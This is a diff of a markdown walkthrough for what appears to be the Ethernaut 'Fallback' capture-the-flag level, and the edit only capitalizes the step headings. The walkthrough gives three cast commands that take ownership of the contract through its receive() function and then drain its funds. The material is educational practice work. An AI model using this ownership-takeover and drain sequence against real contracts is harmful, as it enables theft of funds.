@@ -61,17 +61,17 @@ contract Fallback {
 To become the contract owner, we first need to contribute some ETH and then call the fallback function.
 
 ### Walkthrough
-##### 1. contributing some eth by calling the "contribute()" function
+##### 1. Contributing some eth by calling the "contribute()" function
 ```console
 cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
 ```
 
-##### 2. trigger the fallback function **receive()** by sending an eth transaction with an empty data field
+##### 2. Trigger the fallback function **receive()** by sending an eth transaction with an empty data field
 ```console
 cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
 ```
 
-##### 3. draining the contract
+##### 3. Draining the contract
 ```console
 cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
 ```
